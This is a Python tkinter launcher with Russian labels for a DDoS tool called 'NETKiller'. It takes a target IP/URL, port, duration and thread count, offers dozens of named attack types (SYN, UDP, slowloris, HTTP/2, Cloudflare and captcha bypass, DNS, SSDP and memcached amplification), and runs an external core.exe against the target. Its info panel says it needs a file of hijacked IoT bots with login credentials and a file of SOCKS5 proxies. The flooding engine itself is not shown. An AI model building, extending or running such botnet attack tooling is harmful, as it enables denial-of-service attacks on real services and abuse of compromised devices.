import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import json
import os
import subprocess
import sys

class DDoSAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("NETKiller v1.0")
        self.root.geometry("800x600")
        self.root.resizable(True, True)
        
        # Переменные для хранения значений
        self.target_var = tk.StringVar()
        self.port_var = tk.IntVar(value=443)
        self.duration_var = tk.IntVar(value=60)
        self.threads_var = tk.IntVar(value=1000)
        self.attack_type_var = tk.StringVar(value="udp")
        self.remove_duplicates_var = tk.BooleanVar()
        self.check_duplicates_var = tk.BooleanVar()
        self.remove_dead_var = tk.BooleanVar()
        self.health_check_var = tk.BooleanVar()
        
        self.setup_ui()
        
    def setup_ui(self):
        # Основной фрейм с прокруткой
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Заголовок
        title_label = ttk.Label(main_frame, text="Launcher NETKiller", 
                               font=("Arial", 16, "bold"))
        title_label.pack(pady=(0, 20))
        
        # Фрейм для основных параметров
        basic_frame = ttk.LabelFrame(main_frame, text="Основные параметры", padding=10)
        basic_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Целевой адрес
        ttk.Label(basic_frame, text="Целевой IP/URL:").grid(row=0, column=0, sticky="w", pady=2)
        ttk.Entry(basic_frame, textvariable=self.target_var, width=50).grid(row=0, column=1, padx=5, pady=2)
        
        # Порт
        ttk.Label(basic_frame, text="Порт:").grid(row=1, column=0, sticky="w", pady=2)
        ttk.Entry(basic_frame, textvariable=self.port_var, width=10).grid(row=1, column=1, sticky="w", padx=5, pady=2)
        
        # Длительность
        ttk.Label(basic_frame, text="Длительность (сек):").grid(row=2, column=0, sticky="w", pady=2)
        ttk.Entry(basic_frame, textvariable=self.duration_var, width=10).grid(row=2, column=1, sticky="w", padx=5, pady=2)
        
        # Потоки
        ttk.Label(basic_frame, text="Количество потоков:").grid(row=3, column=0, sticky="w", pady=2)
        ttk.Entry(basic_frame, textvariable=self.threads_var, width=10).grid(row=3, column=1, sticky="w", padx=5, pady=2)
        
        # Тип атаки
        ttk.Label(basic_frame, text="Тип атаки:").grid(row=4, column=0, sticky="w", pady=2)
        attack_types = ['http', 'http2', 'http2a', 
                                #'httpjson', 
                               'http2killer', 'http2multi', 'httpsmuggling', 'http2rapid', 'httpamp', 'httpbrowser', 'httpquic', 'zerotrust',
                               'nginx', 'nginx2', 'nginxultra', 
                               'tls', 'tlsmem', 'sslcpu',
                               'cachebypass', 'websocketbomb', 'cachebypass2', 'headerinjection', 
                               'captchabypass',
                               'cloudflare', 'jscf', 'cfturnstile', 'cfturnstile2',
                               'websocket', 'randomport', 
                               'udp', 'udpsession', 'udpfuzzing', 
                               'tcp', 'tcpack', 'multistage', 'bannergrab', 
                               'raknet', 'raknetfuzz', 'raknetsmart', 'steam', 
                               'minecraftjava', 'mctps', 'minecraftjavaexp', 'minecraftjavac', 'minecraftjavaq',
                               'icmp', 'blackhole', 'bgp', 'ipfragment', 'cpu', 'gre',
                               'isp', 'bras', 'dnsinfra', 
                               'syn', 'slowloris',
                               'dns', 'ssdp', 'memcached',
                               'dnstorture', 'dnsnxdomain', 'dnssubdomain', 'dnstunnel'],
        attack_combo = ttk.Combobox(basic_frame, textvariable=self.attack_type_var, 
                                   values=attack_types, state="readonly", width=20)
        attack_combo.grid(row=4, column=1, sticky="w", padx=5, pady=2)
        
        # Фрейм для опций файлов
        options_frame = ttk.LabelFrame(main_frame, text="Опции файлов", padding=10)
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Checkbutton(options_frame, text="Удалить дубликаты из iot.txt и socks5.txt", 
                       variable=self.remove_duplicates_var).pack(anchor="w", pady=2)
        ttk.Checkbutton(options_frame, text="Проверить файлы на дубликаты", 
                       variable=self.check_duplicates_var).pack(anchor="w", pady=2)
        ttk.Checkbutton(options_frame, text="Удалить недоступные устройства", 
                       variable=self.remove_dead_var).pack(anchor="w", pady=2)
        ttk.Checkbutton(options_frame, text="Проверить доступность устройств", 
                       variable=self.health_check_var).pack(anchor="w", pady=2)

        # Информация о необходимых файлах
        info_frame = ttk.LabelFrame(main_frame, text="Необходимые файлы для атаки", padding=10)
        info_frame.pack(fill=tk.X, pady=(0, 10))
        
        info_text = """Для работы с различными типами ботов требуются следующие файлы:

• iot.txt - IoT боты в формате: ip:port:login:password
• socks5.txt - SOCKS5 прокси в формате: ip:port
• dns_any,dnskey,txt.txt - DNS серверы в формате
Файлы должны находиться в той же директории, что и программа."""
        
        info_label = ttk.Label(info_frame, text=info_text, justify=tk.LEFT, font=("Arial", 9))
        info_label.pack(anchor="w")
        
        # Фрейм для кнопок управления
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=20)
        
        ttk.Button(button_frame, text="Сохранить конфигурацию", 
                  command=self.save_config).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Загрузить конфигурацию", 
                  command=self.load_config).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Запустить атаку", 
                  command=self.launch_attack, style="Accent.TButton").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Выход", 
                  command=self.root.quit).pack(side=tk.LEFT)
        
        # Область логов
        log_frame = ttk.LabelFrame(main_frame, text="Логи", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.log_text = tk.Text(log_frame, height=15, wrap=tk.WORD)
        scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Стиль для акцентной кнопки
        style = ttk.Style()
        style.configure("Accent.TButton", foreground="white", background="#0078D7")
        
        self.log("Attack Controller запущен и готов к работе")
        
    def log(self, message):
        self.log_text.insert(tk.END, f"{message}\n")
        self.log_text.see(tk.END)
        self.root.update()
        
    def save_config(self):
        config = {
            "target": self.target_var.get(),
            "port": self.port_var.get(),
            "duration": self.duration_var.get(),
            "threads": self.threads_var.get(),
            "attack_type": self.attack_type_var.get(),
            "remove_duplicates": self.remove_duplicates_var.get(),
            "check_duplicates": self.check_duplicates_var.get(),
            "remove_dead": self.remove_dead_var.get(),
            "health_check": self.health_check_var.get()
        }
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(config, f, indent=4)
                self.log(f"Конфигурация сохранена в {filename}")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить конфигурацию: {str(e)}")
                
    def load_config(self):
        filename = filedialog.askopenfilename(
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'r') as f:
                    config = json.load(f)
                
                self.target_var.set(config.get("target", ""))
                self.port_var.set(config.get("port", 443))
                self.duration_var.set(config.get("duration", 60))
                self.threads_var.set(config.get("threads", 1000))
                self.attack_type_var.set(config.get("attack_type", "udp"))
                self.remove_duplicates_var.set(config.get("remove_duplicates", False))
                self.check_duplicates_var.set(config.get("check_duplicates", False))
                self.remove_dead_var.set(config.get("remove_dead", False))
                self.health_check_var.set(config.get("health_check", False))
                
                self.log(f"Конфигурация загружена из {filename}")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось загрузить конфигурацию: {str(e)}")
                
    def launch_attack(self):
        if not self.target_var.get():
            messagebox.showwarning("Предупреждение", "Введите целевой IP адрес или URL")
            return
            
        # Создаем команду для запуска
        cmd = [
            "core.exe",
            "--target", self.target_var.get(),
            "--port", str(self.port_var.get()),
            "--duration", str(self.duration_var.get()),
            "--threads", str(self.threads_var.get()),
            "--attack-type", self.attack_type_var.get()
        ]
        
        # Добавляем опциональные флаги
        if self.remove_duplicates_var.get():
            cmd.append("--remove-duplicates")
        if self.check_duplicates_var.get():
            cmd.append("--check-duplicates")
        if self.remove_dead_var.get():
            cmd.append("--remove-dead")
        if self.health_check_var.get():
            cmd.append("--health-check")
            
        self.log(f"Запуск команды: {' '.join(cmd)}")
        
        try:
            # В реальном приложении здесь будет запуск основного .exe
            subprocess.run(cmd, check=True)
            self.log("Атака запущена успешно!")
            self.log(f"Цель: {self.target_var.get()}:{self.port_var.get()}")
            self.log(f"Тип атаки: {self.attack_type_var.get()}")
            self.log(f"Длительность: {self.duration_var.get()} сек")
            self.log(f"Потоки: {self.threads_var.get()}")
            
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запустить атаку: {str(e)}")
            self.log(f"Ошибка: {str(e)}")

def main():
    root = tk.Tk()
    app = DDoSAttackGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()